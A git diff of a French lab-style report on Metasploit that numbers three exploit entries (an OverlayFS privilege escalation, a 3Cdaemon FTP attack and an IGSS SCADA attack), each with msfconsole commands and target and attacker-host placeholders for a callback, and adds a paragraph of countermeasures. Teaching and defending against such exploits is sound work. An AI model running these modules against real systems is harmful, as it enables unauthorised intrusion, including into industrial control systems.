@@ -239,12 +239,12 @@ La deuxième image exécute Metasploit en mode silencieux (paramètre "-q") pour
 
 Pour la partie pratique concernant ces exploits, voici une brève explication des commandes à renseigner pour les exploiter :
 
-- Exploit : exploit/linux/local/cve_2021_3493_overlayfs
+- Exploit 1 : exploit/linux/local/cve_2021_3493_overlayfs
   - msfconsole
   - use exploit/linux/local/cve_2021_3493_overlayfs
   - set SESSION [ID de la session active]
   - run 
-- Exploit : exploit/windows/ftp/3cdaemon_ftp_user
+- Exploit 2 : exploit/windows/ftp/3cdaemon_ftp_user
   - msfconsole
   - use exploit/windows/ftp/3cdaemon_ftp_user
   - set RHOST [IP de la cible]
@@ -253,7 +253,7 @@ Pour la partie pratique concernant ces exploits, voici une brève explication de
   - set LHOST [IP de l'attaquant]
   - set LPORT [Port d'écoute de l'attaquant]
   - exploit
-- Exploit : exploit/windows/scada/igss9_misc
+- Exploit 3 : exploit/windows/scada/igss9_misc
   - msfconsole
   - use exploit/windows/scada/igss9_misc
   - set RHOST [IP de la cible]
@@ -262,7 +262,9 @@ Pour la partie pratique concernant ces exploits, voici une brève explication de
   - set LHOST [IP de l'attaquant]
   - set LPORT [Port d'écoute de l'attaquant]
   - exploit
-  
+
+Pour finir, si l'on souhaite fixer des contre-mesures pour chaque exploit mentionné, on pourrait par exemple effectuer une mise à jour du noyau linux pour combler la faille, resteindre les privilèges pour les utilisateurs et surveiller les logs pour monitorer les événements inhabituels. Concernant le deuxième exploit, il serait plus viable de remplacer le logiciel concerné en abandonnant 3Cdaemon pour un autre serveur FTP plus sécurisé notamment en utilisant des connexions sécurisées via le protocole SFTP et en limitant aussi les ports et accès via des ACL ou un pare feu. Enfin, la troisième exploit serait résolu en semgentant le réseau pour isoler les systèmes SCADA dans un réseau sécurisé, de renforncer la surveillance en mettant en place des solutions de détection des intrusions et en limitant l'exposition à l'interface SCADA.
+
 ---
 
 ## **6. Conclusion**
